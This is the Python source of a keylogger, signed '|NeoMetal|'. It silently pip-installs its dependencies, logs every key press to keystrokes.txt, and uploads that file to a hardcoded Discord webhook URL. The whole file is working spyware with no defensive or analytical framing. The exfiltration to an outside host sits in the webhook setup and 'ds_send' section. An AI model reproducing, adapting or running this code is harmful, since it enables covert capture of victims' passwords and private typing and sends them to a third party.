import os

#depencies install
home_dir = os.path.expanduser("~")
keyboard_path = os.path.join(home_dir, 'AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\keyboard')
discord_path = os.path.join(home_dir, 'AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\discord_webhook')
keyboard_status = os.path.isdir(keyboard_path)
discord_status = os.path.isdir(discord_path)

for i in range(1):
    if keyboard_status & discord_status == True:
        continue
    else:
        os.system(f'pip install keyboard discord_webhook')
#depencies install end

import keyboard
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1233813508907597905/g-G10KDBYHdAARXE-vQyKpR1rwh6A2McIuXsHl0PUZeAwMxXvCd0rfWq4v5t4oH8pUtX', username="Spidey Bot")

#file creation and check
check_file = os.path.isfile('keystrokes.txt')

for i in range(1):
    if check_file == True:
        continue
    else:
        with open("keystrokes.txt", "w") as file:
            file.write("KeyLogger by |NeoMetal|")

log_file = 'keystrokes.txt'

#ds_send part
with open("./keystrokes.txt", 'rb') as message:
    webhook.add_file(file = message.read(), filename="keystrokes.txt")
response = webhook.execute()
#file creation and cheack end

#keylog part
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait()
#keylog part end

